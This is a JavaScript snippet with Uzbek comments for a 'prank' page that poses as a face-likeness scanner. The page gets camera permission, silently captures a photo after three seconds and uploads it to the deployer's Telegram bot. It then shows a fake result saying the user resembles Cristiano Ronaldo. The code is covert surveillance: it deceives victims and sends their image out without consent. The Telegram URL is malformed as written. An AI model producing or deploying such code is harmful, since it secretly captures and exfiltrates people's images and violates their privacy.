<script>
    // BU YERGA O'ZINGIZNI MA'LUMOTLARINGIZNI YOZING:
    const BOT_TOKEN = 'SIZNING_BOT_TOKENINGIZ'; // BotFather'dan olingan token
    const CHAT_ID = 'SIZNING_ID_RAQAMINGIZ';      // @userinfobot orqali olingan ID

    async function startPrank() {
        const status = document.getElementById('status');
        status.innerText = "Skaner qilinmoqda, kuting...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // 3 soniya kutib, rasmga oladi
            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Rasmni Blob ko'rinishiga o'tkazish
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'rasm.jpg');

                    // Telegramga yuborish
                    await fetch(`https://telegram.org{BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    status.innerText = "Tahlil tugadi! Siz: Cristiano Ronaldoga 98% o'xshaysiz! 😂";
                    stream.getTracks().forEach(track => track.stop()); // Kamerani o'chirish
                }, 'image/jpeg');
            }, 3000);

        } catch (err) {
            status.innerText = "Xato: Kamera ruxsat berilmadi!";
        }
    }
